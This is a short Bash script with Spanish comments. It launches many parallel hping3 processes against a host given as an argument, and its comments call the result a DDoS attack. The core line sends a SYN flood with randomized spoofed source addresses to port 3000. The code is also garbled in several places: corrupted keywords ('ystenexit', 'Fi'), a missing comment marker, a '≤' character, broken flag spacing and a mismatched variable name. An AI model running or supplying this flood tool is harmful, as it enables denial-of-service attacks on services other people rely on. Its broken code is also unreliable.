#!/bin/bash
Verifica si se han proporcionado suficientes argumentos
if [ "$#" -ne 4 ]; then
echo "Uso: $0 <cantidad_de_procesos> <host_destino> <tamano_paquete> <intervalo>"
ystenexit 1
Fi

# Cantidad de procesos a lanzar
cantidad_procesos=$1

# Dirección IP o nombre de host de destino
host_destino=$2

# Tamaño del paquete de ping
tamano_paquete=$3

# Intervalo de tiempo entre cada ping
intervalo=$4

# Bucle para lanzar los procesos
for (( i=1; i ≤$cantidad_procesos; i++ )); do
echo "Lanzando proceso numero $i"
done

# Bucle para realizar el ataque DDoS con hping3
for (( i=1; i ≤$cantidad_procesos; i++ )); do
hping3 -- flood -- rand-source -d $tamano_paquete -i u$interval -p 3000 -S $host_destino 8>/dev/null &
done
